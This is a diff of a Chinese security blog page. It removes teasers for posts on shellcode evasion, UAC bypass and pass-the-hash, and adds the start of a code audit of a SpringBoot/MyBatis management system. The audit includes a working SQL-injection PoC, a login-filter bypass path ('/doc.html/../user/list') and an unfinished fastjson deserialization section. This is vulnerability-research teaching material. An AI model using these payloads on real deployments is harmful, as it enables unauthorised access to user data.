-          <a class="article-more-a" href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-shellcode基础与简单调用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/">shellcode的基础免杀</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="shellcode基础"><a href="#shellcode基础" class="headerlink" title="shellcode基础"></a>shellcode基础</h1><h2 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h2><p>shellcode是一段由16进制组成的机器码，因为经常可以让攻击者受到被害机器的shell而得名(但现在shellcode功能更多样，比如添加用户或者执行特殊命令，特殊进程等但是都被统称为shellcode)，其特点是在于它可以无文件落地，直接在内存中运行，以至于一般杀毒软件无法查杀到。一般来说，shellcode会在目标机器上建立一个新的shell进程，然后同攻击者进行通信，接受攻击者的指令，然后返回结果。那么如何建立一个shell进程呢？在Unix中使用execve命令可以建立，而在windows下需要调用内核API来建立。</p>
-<h2 id="shellcode的方向"><a href="#shellcode的方向" class="headerlink" title="shellcode的方向"></a>shellcode的方向</h2><p>shellcode一般分为正向和反向。在msf中，我们经常会发现一个payload有reverse的前缀（表示为反向）它们的原理如下:</p>
-        
-          <a class="article-more-a" href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/21/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-shellcode的基础免杀" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/">shellcode的基础免杀</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" class="archive-article-date">
-  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="杀毒软件基本原理"><a href="#杀毒软件基本原理" class="headerlink" title="杀毒软件基本原理"></a>杀毒软件基本原理</h1><p>学习免杀，就要先学习杀毒软件的基本原理。知己知彼才能百战百胜。</p>
-<h2 id="杀毒软件的基本等级"><a href="#杀毒软件的基本等级" class="headerlink" title="杀毒软件的基本等级"></a>杀毒软件的基本等级</h2><h3 id="1-无毒"><a href="#1-无毒" class="headerlink" title="1.无毒"></a>1.无毒</h3><p>没有任何可疑行为，没有任何特征符合病毒。</p>
-<h3 id="2-可疑"><a href="#2-可疑" class="headerlink" title="2.可疑"></a>2.可疑</h3><p>存在可疑行为:操作注册表，打开powershell，修改用户名，操作敏感文件等。</p>
-<h3 id="3-确认病毒"><a href="#3-确认病毒" class="headerlink" title="3.确认病毒"></a>3.确认病毒</h3><p>特征符合病毒</p>
-        
-          <a class="article-more-a" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-浅谈UAC及绕过" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/">浅谈UAC及绕过</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/" class="archive-article-date">
-  	<time datetime="2022-03-09T13:19:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="UAC工作原理"><a href="#UAC工作原理" class="headerlink" title="UAC工作原理"></a>UAC工作原理</h1><p>UAC是微软<code>Microsoft Windows vista</code>以后版本引入的一种安全机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序(有时也称为”恶意软件”)损坏系统的效果。</p>
-<p>通过UAC，应用程序和任务可始终在非管理员账户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并阻止无意中更改系统设置。</p>
-        
-          <a class="article-more-a" href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-域林渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/">域林渗透</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-03-06T09:10:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="域林渗透基础知识"><a href="#域林渗透基础知识" class="headerlink" title="域林渗透基础知识"></a>域林渗透基础知识</h1><h2 id="什么是windows域"><a href="#什么是windows域" class="headerlink" title="什么是windows域"></a>什么是windows域</h2><p>一个通俗的例子：假设有⼀堆图书，没⼈管理，⼀个班的同学能够随意借阅这些书。由于缺乏管理，图书可能会遇到各种各样的问题，⽐如图书破损、丢失等等。为了解决这个问题，班上设⽴⼀个图书管理员，他负责分配、管理这些图书，任何想借书的⼈都需要向他申请。类⽐这个例⼦，⼀个集体拥有⼀些计算机资源，如果没有⼀个统⼀的管 理系统，每个⼈都能随意操作这些计算机，就会使运维的成本变⾼，为了解决这个问题，我们也可以像管理图书⼀ 样设⽴⼀个管理员，由它来统⼀管理计算机。那么这套体系可以称为⼀个域，域控制器就充当了管理员的⻆⾊，任何加⼊域的计算机都需要服从管理员的管理。</p>
-        
-          <a class="article-more-a" href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-域渗透-pth与委派攻击" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">域渗透--pth与委派攻击</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="archive-article-date">
-  	<time datetime="2022-03-06T07:20:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="PTH与PTT攻击"><a href="#PTH与PTT攻击" class="headerlink" title="PTH与PTT攻击"></a>PTH与PTT攻击</h1><h2 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h2><p>只能是域管理组内的用户的hash可以进行hash传递攻击。</p>
-<p>前提条件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.域内任何一台主机的本地管理员权限。</span><br><span class="line">2.域管理员的NTLM-hash</span><br></pre></td></tr></table></figure>
-
-<p>在域环境中，当我们获得了域管理员组内用户的NTLM哈希值，我们可以使用域内的一台主机用<code>mimikatz</code>对域内的任何一台机器(包括域控)进行哈希传递攻击。执行完命令后，会弹出CMD窗口，在弹出的CMD窗口我们可以访问域内任何一台机器。</p>
-        
-          <a class="article-more-a" href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-elitecms代码审计" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">elitecms代码审计</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="archive-article-date">
-  	<time datetime="2022-03-03T11:09:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>在cnvd随意找到了一个漏洞列表里有这个cms，所以就下下来看了看，而且发现该cms貌似很老了，适合我这种菜逼，并且看了一下网上没有相关的审计（应该是太简单了）所以才审计一下（就当是我自己的处女作吧），提升自己。</p>
-        
-          <a class="article-more-a" href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-内网渗透工具" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">内网渗透工具</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" class="archive-article-date">
-  	<time datetime="2022-02-28T08:06:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="内网渗透工具"><a href="#内网渗透工具" class="headerlink" title="内网渗透工具"></a>内网渗透工具</h1><h2 id="Setspn"><a href="#Setspn" class="headerlink" title="Setspn"></a>Setspn</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a><em><strong><a href="http://iphone.myzaker.com/zaker/link.php?pk=5c6f60cf77ac6443f6177afa&b=aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy9kZXNrdG9wL0FEL3NlcnZpY2UtcHJpbmNpcGFsLW5hbWVz&bcode=99fe68c6&target=_new">SPN</a></strong></em></h3><p>Service Principal Names</p>
-<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN。</p>
-<p>SPN分为两种，一种注册在AD上机器账户(Computers)下，另一种注册在域用户账户下(Users)下。</p>
-<p>当一个服务的权限为Local System或 Network Serivce，则SPN注册在机器账户(Computers)下。当一个服务的权限为一个域用户，则SPN注册在域用户账户(User)下。</p>
-<h3 id="SPN的格式"><a href="#SPN的格式" class="headerlink" title="SPN的格式"></a>SPN的格式</h3><p><code>serviceclass/host:port/servicename</code></p>
-<p>说明:</p>
-<ol>
-<li>serviceclass可以理解为<strong>服务类</strong>的名称，常见的有www,ldap,SMTP,DNS,HOST等。</li>
-<li>host有两种形式，FQDN（全域名）和NetBIOS（简域名）名，例如server01.test.com和server01。</li>
-<li>如果服务运行在默认端口上，则端口号(Port)可以省略。</li>
+        <h1 id="项目技术分析"><a href="#项目技术分析" class="headerlink" title="项目技术分析"></a>项目技术分析</h1><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808132938309.png" alt="image-20220808132938309"></p>
+<p>通过项目结构，能够看出来使用的技术为前后端分离。在看readme文档可以发现，技术框架分别有：</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* 核心框架：SpringBoot 2.0.0</span><br><span class="line">* 持久层框架：Mybatis 1.3.2</span><br><span class="line">* 日志管理：Log4j 2.10.0</span><br><span class="line">* JS框架：Jquery 1.8.0</span><br><span class="line">* UI框架: EasyUI 1.9.4</span><br><span class="line">* 模板框架: AdminLTE 2.4.0</span><br><span class="line">* 项目管理框架: Maven 3.2.3</span><br></pre></td></tr></table></figure>
+
+<p>关于了解系统所使用的开源组件技术的两种情况：</p>
+<p>1.maven项目，打开pom文件查看。带着通用性漏洞的功底针对性寻找突破口。</p>
+<p>2.传统老项目，直接到web-inf下查看jar包。</p>
+<h1 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><ol>
+<li>全局搜索在特定关键字in,like,order by ,group by是否使用了直接拼接的方式(重点)</li>
+<li>全局搜索$在mybatis是否使用，全局搜索+在jdbc或Hibernate是否使用，对于自己封装的数据库操作的增删改查的方法特殊看待。</li>
+<li>查看第三方组件的漏洞(重点)</li>
 </ol>
-        
-          <a class="article-more-a" href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/#more">more >></a>
-        
+<p>对于maven项目，直接查看pom.xml中是否应用了公开的开源组件存在通用性漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.55&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.baomidou&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.0.7.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>既然是mybatis，我们可以很快速的通过是否有$来判断是否存在不安全的拼接，通过限定后缀为xml进行搜索。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808140227184.png" alt="image-20220808140227184"></p>
+<p>比如这里就可以看出有许多不安全的拼接。</p>
+<p>我们选一个有可能有注入的UserMapperEX进行查看。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808140435500.png" alt="image-20220808140435500"></p>
+<p>可以看到username和login_name都使用了模糊搜索，接下来就是向上回溯，判断回溯点是否可控。</p>
+<p>通过全局搜索发现该方法被UserService.java的select方法调用，而select方法被resourceController.java的getlist调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public String getList(@PathVariable(&quot;apiName&quot;) String apiName,</span><br><span class="line">                       @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,</span><br><span class="line">                       @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,</span><br><span class="line">                       @RequestParam(value = Constants.SEARCH, required = false) String search,</span><br><span class="line">                       HttpServletRequest request)</span><br></pre></td></tr></table></figure>
+
+<p>getlist顾名思义就是一个查询数据列表的功能，apiName是一个变量，会根据不同的值查询不同的数据。当值为User时，会查询用户数据，从而触发之前有问题的sql语句的调用。</p>
+<p>让我们在之前的select函数中打上断点，然后从前台访问中，发现点击用户管理时，触发了断点。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808143545267.png" alt="image-20220808143545267"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808143602553.png" alt="image-20220808143602553"></p>
+<p>也可以从抓到的包中发现与getlist方法的参数相对应。其中有PageSize，CureentPage，search。</p>
+<p>而search参数经过了特殊处理。以<code>&#123;&#125;</code>格式进行了包装。</p>
+<p>因此我们可以构造以下poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;userName&quot;:&quot;&#x27; or 1=1 and &#x27;1%&#x27;=&#x27;1&quot;,&quot;loginName&quot;:&quot;&quot;&#125;</span><br><span class="line">通过转码变成</span><br><span class="line">%7B%22userName%22%3A%22&#x27;%20or%201%3D1%20and%20&#x27;1%25&#x27;%3D&#x27;1%22%2C%22loginName%22%3A%22%22%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808144832430.png" alt="image-20220808144832430"></p>
+<p>注入成功</p>
+<h2 id="webfilter绕过"><a href="#webfilter绕过" class="headerlink" title="webfilter绕过"></a>webfilter绕过</h2><p>Webfilter是一个Tomcat组件，用于拦截我们指定的url，当请求发送到Tomcat服务器时，会调用拦截器的doFilter方法进行判断。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="params"><span class="function">                        FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">       HttpServletRequest servletRequest = (HttpServletRequest) request;</span><br><span class="line">       HttpServletResponse servletResponse = (HttpServletResponse) response;</span><br><span class="line">       String requestUrl = servletRequest.getRequestURI();</span><br><span class="line">       <span class="comment">//具体，比如：处理若用户未登录，则跳转到登录页</span></span><br><span class="line">       Object userInfo = servletRequest.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span>(userInfo!=<span class="keyword">null</span>) &#123; <span class="comment">//如果已登录，不阻止</span></span><br><span class="line">           chain.doFilter(request, response);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (requestUrl != <span class="keyword">null</span> &amp;&amp; (requestUrl.contains(<span class="string">&quot;/doc.html&quot;</span>) ||</span><br><span class="line">           requestUrl.contains(<span class="string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="string">&quot;/login.html&quot;</span>))) &#123;</span><br><span class="line">           chain.doFilter(request, response);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (verify(ignoredList, requestUrl)) &#123;</span><br><span class="line">           chain.doFilter(servletRequest, response);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">for</span> (String url : allowUrls) &#123;</span><br><span class="line">               <span class="keyword">if</span> (requestUrl.startsWith(url)) &#123;</span><br><span class="line">                   chain.doFilter(request, response);</span><br><span class="line">                   <span class="keyword">return</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       servletResponse.sendRedirect(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> String regexPrefix = <span class="string">&quot;^.*&quot;</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> String regexSuffix = <span class="string">&quot;.*$&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以发现，如果url中包含了<code>/doc.html</code>,<code>/register.html</code>,<code>/login.html</code>则直接跳过了当前的filter，转到下一个filter当中。(下一个chain.filter是没有做过滤的)</p>
+<p>所以这里可以清除一下cookie，使用以下url并进行抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/doc.html/../user/list?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D&amp;currentPage=1&amp;pageSize=15</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808152730472.png" alt="image-20220808152730472"></p>
+<p>依然查询成功。</p>
+<h2 id="Fastjson反序列化"><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h2><p>fastjson的核心就在于调用了fastjson.JSON的parseObject函数讲json字符串反序列化成对象，搜一下parseObject，可以发现遍地开花，其中有一个getinfo是在utils下的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getInfo</span><span class="params">(String search, String key)</span></span>&#123;</span><br><span class="line">        String value = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(search!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            JSONObject obj = JSONObject.parseObject(search);</span><br><span class="line">            value = obj.getString(key);</span><br><span class="line">            <span class="keyword">if</span>(value.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                value = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    